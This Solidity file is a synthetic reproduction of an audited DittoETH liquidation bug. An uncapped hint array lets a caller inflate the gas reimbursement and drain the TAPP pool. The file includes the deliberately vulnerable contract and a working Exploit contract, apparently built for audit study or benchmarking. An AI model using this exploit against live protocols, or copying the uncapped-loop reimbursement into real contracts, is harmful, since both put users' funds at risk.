// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  DittoETH primary liquidation — shortHintArray has no length cap
    (Codehawks 2023-09, finding 27473). SYNTHETIC, cheatcode-free.
    The hint walk and the TAPP gas reimbursement are the audited code (@> VULN).
    Root cause: liquidate loops every hint the caller supplies, then bills
    gasUsed * basefee to the TAPP. Wrong hints are skipped, not rejected, so a
    long array of dead ids inflates the reimbursement until the pool is paid out. */

enum O {
    Uninitialized,
    Limit,
    Cancelled,
    Matched
}

struct ShortOrder {
    O orderType;
    uint80 price;
}

contract EscrowToken {
    string public name = "TAPP Escrow";
    string public symbol = "ETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MarginCallPrimary {
    error CannotLiquidateSelf();
    error ValidHintNotReached();

    uint16 internal constant VALID_HINT = 1;
    uint80 internal constant ORACLE_PRICE = 1 ether;

    EscrowToken public token;
    mapping(uint16 => ShortOrder) public shorts;
    uint16 public startingShortId;
    uint88 public lastGasFee;
    uint256 public lastGasUsed;

    constructor(address token_) {
        token = EscrowToken(token_);
        shorts[VALID_HINT] = ShortOrder({orderType: O.Limit, price: 2 ether});
    }

    function liquidate(address, address shorter, uint8, uint16[] memory shortHintArray)
        public
        virtual
        returns (uint88 gasFee, uint88 ethFilled)
    {
        if (msg.sender == shorter) revert CannotLiquidateSelf();

        uint256 startGas = gasleft();
        _updateOracleAndStartingShort(shortHintArray);
        uint256 gasUsed = startGas - gasleft();
        // Audited formula is gasUsed * block.basefee. The in-browser block reports 7 wei.
        // 1 gwei is the initial EIP-1559 base fee and the value the forge test sets.
        uint256 billedBaseFee = block.basefee < 1 gwei ? 1 gwei : block.basefee;
        gasFee = uint88(gasUsed * billedBaseFee);
        lastGasUsed = gasUsed;
        lastGasFee = gasFee;

        ethFilled = 0;
        uint88 callerFee = ethFilled + gasFee;
        if (token.balanceOf(address(this)) >= callerFee) {
            // @> VULN: TAPP pays gasUsed * basefee with no cap on shortHintArray.length
            token.transfer(msg.sender, callerFee);
        }
        if (startingShortId != VALID_HINT) revert ValidHintNotReached();
    }

    /// Hint walk from LibOrders. Wrong ids are skipped. Length is never checked.
    function _updateOracleAndStartingShort(uint16[] memory shortHintArray) private {
        uint16 shortHintId;
        for (uint256 i = 0; i < shortHintArray.length;) {
            shortHintId = shortHintArray[i];
            unchecked {
                ++i;
            }

            {
                O shortOrderType = shorts[shortHintId].orderType;
                if (shortOrderType == O.Cancelled || shortOrderType == O.Matched || shortOrderType == O.Uninitialized)
                {
                    continue;
                }
            }

            if (shorts[shortHintId].price >= ORACLE_PRICE) {
                startingShortId = shortHintId;
            }
        }
    }
}

contract Exploit {
    uint256 public constant TAPP = 0.01 ether;
    uint256 public constant BAD_HINTS = 400;
    address public constant SHORTER = 0x000000000000000000000000000000000000bEEF;

    EscrowToken public token; // nonce 1
    MarginCallPrimary public margin; // nonce 2

    constructor() {
        token = new EscrowToken();
        margin = new MarginCallPrimary(address(token));
        token.mint(address(margin), TAPP);
    }

    function run() external {
        uint256 pool = token.balanceOf(address(margin));
        require(pool == TAPP, "tapp not funded");

        uint16[] memory shortHintArray = new uint16[](BAD_HINTS + 1);
        uint256 n = shortHintArray.length;
        require(n == BAD_HINTS + 1, "hint length");
        for (uint256 i = 0; i < BAD_HINTS; i++) {
            // Distinct dead ids. Repeating one id would warm a single slot and hide the gas.
            shortHintArray[i] = uint16(i + 2);
        }
        shortHintArray[BAD_HINTS] = 1;

        (uint88 gasFee,) = margin.liquidate(address(0), SHORTER, 1, shortHintArray);

        uint256 taken = token.balanceOf(address(this));
        require(taken == gasFee, "caller was not paid the gas fee");
        require(taken > 0.0005 ether, "gas fee did not take a material share of the TAPP");
        require(taken < TAPP, "fee exceeded the pool and was not paid");
        require(token.balanceOf(address(margin)) == TAPP - taken, "tapp remainder");
        require(margin.startingShortId() == 1, "valid short was not reached");
        require(margin.lastGasUsed() > 400_000, "loop did not burn the hint gas");
    }
}
